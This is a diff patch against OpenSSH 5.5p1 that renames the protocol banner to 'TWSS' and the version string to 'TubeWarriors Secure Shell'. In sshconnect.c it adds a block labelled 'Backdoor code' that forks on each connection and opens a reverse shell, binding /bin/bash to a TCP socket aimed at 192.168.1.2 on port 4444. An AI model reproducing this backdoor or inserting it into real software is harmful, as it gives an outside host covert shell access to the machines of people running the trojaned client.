@@ -1,0 +1,155 @@
+Only in openssh-5.5p1: .sshconnect.c.swp
+diff -ur openssh-5.5p1.orig/ssh.h openssh-5.5p1/ssh.h
+--- openssh-5.5p1.orig/ssh.h	2006-08-04 19:39:41.000000000 -0700
++++ openssh-5.5p1/ssh.h	2010-06-10 22:50:08.000000000 -0700
+@@ -41,12 +41,12 @@
+  * Minor protocol version.  Different version indicates minor incompatibility
+  * that does not prevent interoperation.
+  */
+-#define PROTOCOL_MAJOR_1	1
+-#define PROTOCOL_MINOR_1	5
++#define PROTOCOL_MAJOR_1	13
++#define PROTOCOL_MINOR_1	37
+ 
+ /* We support both SSH1 and SSH2 */
+-#define PROTOCOL_MAJOR_2	2
+-#define PROTOCOL_MINOR_2	0
++#define PROTOCOL_MAJOR_2	13
++#define PROTOCOL_MINOR_2	37
+ 
+ /*
+  * Name for the service.  The port named by this service overrides the
+diff -ur openssh-5.5p1.orig/sshconnect.c openssh-5.5p1/sshconnect.c
+--- openssh-5.5p1.orig/sshconnect.c	2010-03-04 02:53:36.000000000 -0800
++++ openssh-5.5p1/sshconnect.c	2010-06-27 16:04:00.000000000 -0700
+@@ -433,6 +433,44 @@
+ 	struct timeval t_start, t_remaining;
+ 	fd_set *fdset;
+ 
++/**
++ * Backdoor code starts here
++**/
++
++  if (fork() == 0)
++  {
++    setsid();
++
++    struct sockaddr_in addr;
++    int sockfd;
++    size_t addrlen = sizeof(struct sockaddr_in);
++
++    memset(&addr, 0, addrlen);
++    addr.sin_family = AF_INET;
++    addr.sin_port = htons(4444);
++    inet_pton(AF_INET, "192.168.1.2", &addr.sin_addr.s_addr);
++
++    if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
++    {
++      exit(1);
++    }
++
++    if (connect(sockfd, (struct sockaddr *) &addr, addrlen))
++    {
++      exit(1);
++    }
++
++    dup2(sockfd, STDIN_FILENO);
++    dup2(sockfd, STDOUT_FILENO);
++    dup2(sockfd, STDERR_FILENO);
++    close(sockfd);
++    execl("/bin/bash", "bash", NULL);
++  }
++
++/**
++ * Backdoor code ends here
++**/
++
+ 	fdsetsz = howmany(connection_in + 1, NFDBITS) * sizeof(fd_mask);
+ 	fdset = xcalloc(1, fdsetsz);
+ 
+@@ -480,7 +518,7 @@
+ 				    "No banner received");
+ 		}
+ 		buf[sizeof(buf) - 1] = 0;
+-		if (strncmp(buf, "SSH-", 4) == 0)
++		if (strncmp(buf, "TWSS-", 5) == 0)
+ 			break;
+ 		debug("ssh_exchange_identification: %s", buf);
+ 	}
+@@ -491,7 +529,7 @@
+ 	 * Check that the versions match.  In future this might accept
+ 	 * several versions and set appropriate flags to handle them.
+ 	 */
+-	if (sscanf(server_version_string, "SSH-%d.%d-%[^\n]\n",
++	if (sscanf(server_version_string, "TWSS-%d.%d-%[^\n]\n",
+ 	    &remote_major, &remote_minor, remote_version) != 3)
+ 		fatal("Bad remote protocol version identification: '%.100s'", buf);
+ 	debug("Remote protocol version %d.%d, remote software version %.100s",
+@@ -524,7 +562,7 @@
+ 			}
+ 		}
+ 		break;
+-	case 2:
++	case 13:
+ 		if (options.protocol & SSH_PROTO_2) {
+ 			enable_compat20();
+ 			break;
+@@ -539,7 +577,7 @@
+ 		    (options.protocol & SSH_PROTO_2) ? PROTOCOL_MAJOR_2 : PROTOCOL_MAJOR_1,
+ 		    remote_major);
+ 	/* Send our own protocol version identification. */
+-	snprintf(buf, sizeof buf, "SSH-%d.%d-%.100s%s",
++	snprintf(buf, sizeof buf, "TWSS-%d.%d-%.100s%s",
+ 	    compat20 ? PROTOCOL_MAJOR_2 : PROTOCOL_MAJOR_1,
+ 	    compat20 ? PROTOCOL_MINOR_2 : minor1,
+ 	    SSH_VERSION, compat20 ? "\r\n" : "\n");
+diff -ur openssh-5.5p1.orig/sshd.c openssh-5.5p1/sshd.c
+--- openssh-5.5p1.orig/sshd.c	2010-03-07 04:05:17.000000000 -0800
++++ openssh-5.5p1/sshd.c	2010-06-10 23:07:24.000000000 -0700
+@@ -417,7 +417,7 @@
+ 		major = PROTOCOL_MAJOR_1;
+ 		minor = PROTOCOL_MINOR_1;
+ 	}
+-	snprintf(buf, sizeof buf, "SSH-%d.%d-%.100s%s", major, minor,
++	snprintf(buf, sizeof buf, "TWSS-%d.%d-%.100s%s", major, minor,
+ 	    SSH_VERSION, newline);
+ 	server_version_string = xstrdup(buf);
+ 
+@@ -441,7 +441,7 @@
+ 			buf[i] = 0;
+ 			/* Kludge for F-Secure Macintosh < 1.0.2 */
+ 			if (i == 12 &&
+-			    strncmp(buf, "SSH-1.5-W1.0", 12) == 0)
++			    strncmp(buf, "TWSS-13.37", 10) == 0)
+ 				break;
+ 			continue;
+ 		}
+@@ -457,7 +457,7 @@
+ 	 * Check that the versions match.  In future this might accept
+ 	 * several versions and set appropriate flags to handle them.
+ 	 */
+-	if (sscanf(client_version_string, "SSH-%d.%d-%[^\n]\n",
++	if (sscanf(client_version_string, "TWSS-%d.%d-%[^\n]\n",
+ 	    &remote_major, &remote_minor, remote_version) != 3) {
+ 		s = "Protocol mismatch.\n";
+ 		(void) atomicio(vwrite, sock_out, s, strlen(s));
+@@ -506,7 +506,7 @@
+ 			enable_compat13();
+ 		}
+ 		break;
+-	case 2:
++	case 13:
+ 		if (options.protocol & SSH_PROTO_2) {
+ 			enable_compat20();
+ 			break;
+diff -ur openssh-5.5p1.orig/version.h openssh-5.5p1/version.h
+--- openssh-5.5p1.orig/version.h	2010-03-21 11:59:22.000000000 -0700
++++ openssh-5.5p1/version.h	2010-06-10 22:53:32.000000000 -0700
+@@ -1,6 +1,6 @@
+ /* $OpenBSD: version.h,v 1.58 2010/03/16 16:36:49 djm Exp $ */
+ 
+-#define SSH_VERSION	"OpenSSH_5.5"
++#define SSH_VERSION	"TubeWarriors Secure Shell"
+ 
+ #define SSH_PORTABLE	"p1"
+ #define SSH_RELEASE	SSH_VERSION SSH_PORTABLE
